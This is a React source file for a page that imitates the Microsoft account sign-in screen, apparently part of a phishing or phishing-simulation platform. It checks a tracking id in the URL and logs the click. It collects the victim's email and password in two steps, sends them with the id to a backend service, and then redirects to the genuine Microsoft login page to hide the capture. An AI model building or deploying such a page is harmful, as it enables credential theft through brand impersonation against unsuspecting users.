import React, { useEffect, useState } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import './MSPortal.css';
import logo from '../../assets/img/mslogo.svg';
import keyIcon from '../../assets/img/key.png';
import { logClick, submitCredentials } from '../../services/MSPortalService';

const MSPortal = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [step, setStep] = useState(1);
    const [isValid, setIsValid] = useState(false); // Tracks validation state
    const [isLoading, setIsLoading] = useState(true); // Tracks loading state
    const navigate = useNavigate();
    const [searchParams] = useSearchParams();

    // Query parameter validation and click logging
    useEffect(() => {
        document.title = "Sign in to your Account"
        const validateAndLogClick = async () => {
            const trackingId = searchParams.get('id');

            if (!trackingId || trackingId.length < 4 || !/^[a-zA-Z0-9]+$/.test(trackingId)) {
                navigate('/error');
                return;
            }

            const result = await logClick(trackingId);

            if (result.success) {
                setIsValid(true);
            } else {
                console.error(result.message);
                navigate('/error');
            }

            setIsLoading(false);
        };

        validateAndLogClick();
    }, [navigate, searchParams]);

    const handleEmailSubmit = (e) => {
        e.preventDefault();
        setStep(2);
    };

    const handlePasswordSubmit = async (e) => {
        e.preventDefault();

        const trackingId = searchParams.get('id');

        if (!trackingId) {
            window.alert('The Application URL is invalid or incomplete. Please check your email for the correct and active link.');
            return;
        }

        const result = await submitCredentials(email, password, trackingId);

        if (result.success) {
            window.location.href = 'https://login.microsoftonline.com';
        } else {
            window.alert(result.message);
        }
    };

    if (isLoading) {
        // Show loading spinner while validation is in progress
        return (
            <div className="loading-container">
                <div className="spinner-container">
                    <div className="spinner"></div>
                    <div className="spinner-shadow"></div>
                </div>
            </div>

        );
    }

    return (
        <div className="ms-portal">
            <div className="form-container">
                <img src={logo} alt="Logo" className="ms-logo" />
                {step === 1 && (
                    <form onSubmit={handleEmailSubmit}>
                        <h1 className="form-title">Sign in</h1>
                        <input
                            type="email"
                            className="ms-input"
                            placeholder="Email, phone, or Skype"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            required
                        />
                        <div className="link-container">
                            <span>No account? </span>
                            <a href="#" className="link">Create one!</a>
                        </div>
                        <a href="#" className="link">Can't access your account?</a>
                        <div className="button-container">
                            <button type="button" className="btn-back" disabled>Back</button>
                            <button type="submit" className="btn-next">Next</button>
                        </div>
                    </form>
                )}
                {step === 2 && (
                    <form onSubmit={handlePasswordSubmit}>
                        <p className="form-subtitle">{email}</p>
                        <h1 className="form-title">Enter password</h1>
                        <input
                            type="password"
                            className="ms-input"
                            placeholder="Password"
                            onChange={(e) => setPassword(e.target.value)}
                            required
                        />
                        <div href="#" className="link">Forgot password?</div>
                        <div href="#" className="link">Forgot username</div>
                        <div className="button-container">
                            <button type="submit" className="btn-next">Sign in</button>
                        </div>
                    </form>
                )}
            </div>
            {step === 1 && (
                <div className="options-container">
                    <img src={keyIcon} alt="Key Icon" className="key-icon" />
                    <a href="#" className="options-text">Sign-in options</a>
                </div>
            )}
        </div>
    );
};

export default MSPortal;
